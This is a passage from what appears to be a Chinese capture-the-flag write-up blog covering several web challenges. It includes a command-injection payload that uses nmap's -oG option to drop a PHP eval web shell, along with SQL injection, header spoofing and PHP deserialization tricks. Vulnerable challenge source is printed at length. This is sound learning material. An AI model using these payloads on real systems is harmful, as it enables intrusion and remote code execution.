escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题是考命令注入的，主要问题出在<code>escapeshellarg</code>和<code>escapeshellcmd</code>函数一起使用不当会导致多个参数的注入问题</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214180805.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214180828.png" alt=""></p><p>同时官方文档提示了警告⚠️</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214180858.png" alt=""></p><p><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p><p><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html" target="_blank" rel="noopener">谈escapeshellarg绕过与参数注入漏洞</a></p><p>举个例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="string">"127.0.0.1' -s -h '"</span>;</span><br><span class="line">$host = escapeshellarg($host);</span><br><span class="line"><span class="keyword">echo</span> $host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;\n"</span>;</span><br><span class="line">$host = escapeshellcmd($host);</span><br><span class="line"><span class="keyword">echo</span> $host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;\n"</span>;</span><br><span class="line">$sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">chdir($sandbox);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214181526.png" alt=""></p><p><code>127.0.0.1&#39; -s -h &#39;</code>在经过<code>escapeshellarg</code>函数处理后</p><p>变成了<code>&#39;127.0.0.1&#39;\&#39;&#39; -h &#39;\&#39;&#39;&#39;</code></p><p>这里可以看到对<code>I地址P</code>后面的单引号进行了转义，同样对语句最后的单引号进行了转义</p><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">' -----&gt; '\''</span><br></pre></td></tr></table></figure><p>最后给整条语句包裹上一对单引号结束</p><p><code>&#39;127.0.0.1&#39;\&#39;&#39; -h &#39;\&#39;&#39;&#39;</code>这条语句经过<code>escapeshellcmd</code>函数处理后</p><p>变成了<code>&#39;127.0.0.1&#39;\\&#39;&#39; -h &#39;\\&#39;&#39;&#39;</code></p><p>对斜杠进行了转义，但问题出现在这里</p><p>此时的完整<code>shell语句</code>为：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F '127.0.0.1'\\'' -h '\\'''</span><br></pre></td></tr></table></figure><p>此时由于斜杠被转义，导致后面的单引号没有被转义，和他后面的单引号组成了<code>&#39;&#39;</code>，形成了空白字符，后面部分同理</p><p>导致最后被扫描的<code>Ip</code>为<code>127.0.0.1\</code></p><p>但如果是命令执行的连接符号，比如<code>&amp;、||、;、&amp;&amp;</code>会被强制加斜杠导致不可利用，这时候可以考虑从<code>Nmap</code>本身的输出入手</p><p>查询<code>Nmap</code>的所有输出参数</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214182808.png" alt=""></p><p>可以使用<code>-oG</code>参数，其他参数使用有问题</p><p>比如<code>-oN</code>参数会出现这种情况导致不可利用</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214184027.png" alt=""></p><p>那么可以按照上面原理写<code>payload</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">?host=' <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[a]);<span class="meta">?&gt;</span></span> -oG a2u13.php '</span><br></pre></td></tr></table></figure><p>这里给了<code>sandbox</code>的目录，就可以拿到<code>flag</code>了</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214184351.png" alt=""></p><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214190136.png" alt=""></p><p>看网页源代码得到一个超链接<code>Secret.php</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214190220.png" alt=""></p><p>又是<code>Referer</code>伪造的</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214190510.png" alt=""></p><p>然后伪造<code>User-Agent</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214190402.png" alt=""></p><p>接下来伪造<code>X-Forwarded-For</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214190450.png" alt=""></p><p>得到<code>flag</code></p><h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214193127.png" alt=""></p><p>这道题找了半天，注入点在<code>password</code>这里</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214193413.png" alt=""></p><p>直接<code>sqlmap</code>全部一把梭，或者自己<code>extractvalue</code>一步步手注也可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214194017.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214194047.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214194119.png" alt=""></p><p>这里分开一段一段查询即可</p><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>看到源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一个<code>if</code>直接<code>php://input</code>绕过即可</p><p>然后这边用<code>php://filter</code>读一下<code>useless.php</code>的源码</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214195733.png" alt=""></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显由于过滤了<code>flag</code>，得需要在包含<code>useless.php</code>文件然后用反序列化来读</p><p>这里来构造一下反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">  <span class="keyword">public</span> $file=<span class="string">"flag.php"</span>;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Flag;</span><br><span class="line"><span class="keyword">echo</span> serialize($a)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出反序列化结果:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>然后包含<code>useless.php</code>文件，<code>password</code>设置为<code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>即得到<code>flag</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214200633.png" alt=""></p><h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><p>打开后进行常规的注册登录操作，发现登录后是个网盘界面</p><p>其中<code>download.php</code>存在任意文件下载漏洞</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215002005.png" alt=""></p><p>这里把所有的有关文件全部下载下来看看</p><p><strong>upload.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>])) &#123;</span><br><span class="line">    $filename = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $pos = strrpos($filename, <span class="string">"."</span>);</span><br><span class="line">    <span class="keyword">if</span> ($pos !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $filename = substr($filename, <span class="number">0</span>, $pos);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $fileext = <span class="string">".gif"</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/gif'</span>:</span><br><span class="line">            $fileext = <span class="string">".gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/jpeg'</span>:</span><br><span class="line">            $fileext = <span class="string">".jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/png'</span>:</span><br><span class="line">            $fileext = <span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Only gif/jpg/png allowed"</span>);</span><br><span class="line">            Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">            <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; strlen($filename) !== <span class="number">0</span>) &#123;</span><br><span class="line">        $dst = $_SESSION[<span class="string">'sandbox'</span>] . $filename . $fileext;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dst);</span><br><span class="line">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">        Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">        <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Invaild filename"</span>);</span><br><span class="line">        Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">        <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>delete.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>download.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span><br><span class="line">    <span class="keyword">echo</span> $file-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到这里限制了可读目录为<code>/etc</code>、<code>/tmp</code>和当前目录</p><p>以及当前目录被设置到<code>$_SESSION[&#39;sandbox&#39;]</code>，所以下载的时候需要使用<code>../../</code>进行跳转</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/css/panel.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/bootstrap.bundle.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/toast.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/panel.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=<span class="string">"breadcrumb"</span>&gt;</span><br><span class="line">    &lt;ol class="breadcrumb"&gt;</span><br><span class="line">        &lt;li class="breadcrumb-item active"&gt;管理面板&lt;/li&gt;</span><br><span class="line">        &lt;li class="breadcrumb-item active"&gt;&lt;label for="fileInput" class="fileLabel"&gt;上传文件&lt;/label&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li class="active ml-auto"&gt;&lt;a href="#"&gt;你好 &lt;?php echo $_SESSION['username']?&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line">&lt;input type="file" id="fileInput" class="hidden"&gt;</span><br><span class="line">&lt;div class="top" id="toast-container"&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileList($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$a-&gt;Name();</span><br><span class="line">$a-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>class.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $db;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $db;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;</span><br><span class="line">db = $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">$stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$stmt-&gt;store_result();</span><br><span class="line">$count = $stmt-&gt;num_rows;</span><br><span class="line"><span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">$stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">$stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$stmt-&gt;bind_result($expect);</span><br><span class="line">$stmt-&gt;fetch();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> $files;</span><br><span class="line"><span class="keyword">private</span> $results;</span><br><span class="line"><span class="keyword">private</span> $funcs;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">$filenames = scandir($path);</span><br><span class="line">$key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line"><span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">$key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line"><span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"><span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">  $file = <span class="keyword">new</span> File();</span><br><span class="line">  $file-&gt;open($path . $filename);</span><br><span class="line">  array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">  <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$table = <span class="string">'</span></span><br><span class="line"><span class="string">&lt;div id="container" class="container"&gt;</span></span><br><span class="line"><span class="string">  &lt;div class="table-responsive"&gt;</span></span><br><span class="line"><span class="string">    &lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">      $table .= <span class="string">'</span></span><br><span class="line"><span class="string">      &lt;thead&gt;</span></span><br><span class="line"><span class="string">        &lt;tr&gt;'</span>;</span><br><span class="line">          <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'</span></span><br><span class="line"><span class="string">          &lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;</span></span><br><span class="line"><span class="string">          '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'</span></span><br><span class="line"><span class="string">          &lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;</span></span><br><span class="line"><span class="string">          '</span>;</span><br><span class="line">          $table .= <span class="string">'&lt;/thead&gt;</span></span><br><span class="line"><span 